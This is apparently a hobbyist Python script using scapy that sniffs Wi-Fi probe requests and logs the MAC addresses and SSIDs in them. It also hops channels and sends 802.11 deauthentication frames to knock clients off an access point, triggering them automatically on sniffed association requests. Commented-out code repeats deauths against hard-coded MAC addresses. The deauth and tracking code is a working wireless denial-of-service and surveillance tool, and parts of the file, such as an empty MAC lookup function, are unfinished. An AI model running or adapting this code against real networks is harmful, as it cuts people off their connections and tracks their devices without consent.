from scapy.all import *
import os
import time
from threading import Thread

IFACE = "wlan0mon"


def stopfilter(condition):
    if condition:
        return True
    else:
        return False


def handler(pkt):
    if not pkt.haslayer(Dot11ProbeReq):
        return
    curmac = pkt.addr2
    curmac = curmac.upper()
    print('\033[95m' + 'Probe MAC Address: ' + pkt.addr2 + ' from device ' + '\033[93m' + curmac + '\033[0m with SSID: {pkt.info}'.format(pkt=pkt))


def check_deauth(pkt):
    print("Recived package")
    elt = pkt[Dot11Elt]
    while elt and elt.ID != 0:
        elt = elt.payload[Dot11Elt]
    print(elt.info)
    #if elt.info == SSID:
    deauth(pkt[Dot11].addr1, pkt[Dot11].addr2)


def deauth(bssid, client):
    print("Sending deauth")

    packet = RadioTap() / \
             Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
             Dot11Deauth(reason=7)
    sendp(packet, iface=IFACE)

# for _ in range(20):
#     time.sleep(1)
#     deauth(bssid="42:5e:f6:4a:a2:e8", client="0A:A1:6A:C8:4F:3A")

def change_channel():
    """
    @ https://thepacketgeek.com/scapy/sniffing-custom-actions/part-2/
    Note: Channels 12 and 13 are allowed in low-power mode, while channel 14 is banned and only allowed in Japan.
    Thus we don't use channel 14.
    """
    ch = 1
    while True:
        os.system(f"iwconfig {IFACE} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = (ch % 13) + 1
        time.sleep(0.5)


# # start the channel changer
# channel_changer = Thread(target=change_channel)
# channel_changer.daemon = True
# channel_changer.start()
#
#os.system(f"iwconfig {IFACE} channel {3}")

#sniff(iface=IFACE, prn=check_deauth, filter='type mgt subtype assoc-req')  # start sniffin

def get_mac_of_AP(ssid: str, iface: str) -> str:
    """
    Get MAC ADDRESS OF AP with specific AP
    @Oliver 08/03/22
    """
    sniff(iface=iface, filter='type mgt ')


SSID = "b'Sams 9'"

